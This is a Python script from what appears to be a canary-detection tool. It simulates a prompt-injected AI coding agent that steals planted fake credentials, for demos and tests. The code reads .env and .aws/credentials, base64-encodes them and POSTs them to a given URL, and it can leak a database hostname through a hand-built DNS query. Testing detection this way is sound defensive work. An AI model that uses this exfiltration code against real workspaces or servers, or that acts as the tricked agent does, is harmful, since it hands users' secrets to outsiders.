#!/usr/bin/env python3
"""Stand-in for a compromised or prompt-injected AI coding agent (demos and tests only).

This script simulates an agent that has been tricked into exfiltrating the fake
credentials that ``agent-canary plant`` left in a workspace. It sends everything to
listeners that YOU control and point it at: the ``--url`` of your own HTTP canary
listener and, optionally, the ``--dns`` address of your own DNS canary listener. It
never contacts a third party. Use it only against your own agent-canary listeners to
check that detection works end to end.

What it does:

* reads ``.env`` and ``.aws/credentials`` from ``--workspace``, base64-encodes each
  file and POSTs them as JSON to ``--url`` (the HTTP listener detects the encoded
  secrets);
* parses the ``DATABASE_URL`` host out of ``.env`` and, when ``--dns HOST:PORT`` is
  given, resolves it by sending a hand-built DNS A query straight to that address over
  UDP, so no system resolver configuration is needed.
"""

from __future__ import annotations

import argparse
import base64
import contextlib
import json
import os
import socket
import struct
import sys
import urllib.request
from pathlib import Path
from urllib.parse import urlsplit


def _read(path: Path) -> str:
    try:
        return path.read_text(encoding="utf-8")
    except OSError:
        return ""


def _database_host(env_text: str) -> str | None:
    for line in env_text.splitlines():
        key, sep, value = line.partition("=")
        if sep and key.strip() == "DATABASE_URL":
            return urlsplit(value.strip()).hostname
    return None


def _dns_query(hostname: str) -> bytes:
    """Build a minimal DNS standard query for the A record of ``hostname``."""
    header = os.urandom(2) + struct.pack(">HHHHH", 0x0100, 1, 0, 0, 0)
    qname = b"".join(
        bytes([len(label)]) + label.encode("ascii") for label in hostname.split(".") if label
    )
    question = qname + b"\x00" + struct.pack(">HH", 1, 1)  # QTYPE=A, QCLASS=IN
    return header + question


def exfil_http(url: str, env_text: str, aws_text: str) -> int:
    payload = {
        "env": base64.b64encode(env_text.encode("utf-8")).decode("ascii"),
        "aws": base64.b64encode(aws_text.encode("utf-8")).decode("ascii"),
    }
    body = json.dumps(payload).encode("utf-8")
    request = urllib.request.Request(  # noqa: S310 - demo posts to the user's own listener URL
        url, data=body, headers={"Content-Type": "application/json"}, method="POST"
    )
    with urllib.request.urlopen(request, timeout=5) as response:  # noqa: S310
        return response.status


def resolve_dns(hostname: str, host: str, port: int) -> None:
    packet = _dns_query(hostname)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(3)
        sock.sendto(packet, (host, port))
        with contextlib.suppress(TimeoutError):
            sock.recvfrom(512)


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--workspace", type=Path, required=True)
    parser.add_argument("--url", required=True, help="HTTP canary listener URL to POST to")
    parser.add_argument("--dns", metavar="HOST:PORT", help="DNS canary listener address")
    args = parser.parse_args(argv)

    env_text = _read(args.workspace / ".env")
    aws_text = _read(args.workspace / ".aws" / "credentials")

    status = exfil_http(args.url, env_text, aws_text)
    print(f"http POST {args.url} -> {status}")

    hostname = _database_host(env_text)
    if args.dns and hostname:
        host, _, port = args.dns.rpartition(":")
        resolve_dns(hostname, host.strip("[]"), int(port))
        print(f"dns query {hostname} -> {args.dns}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
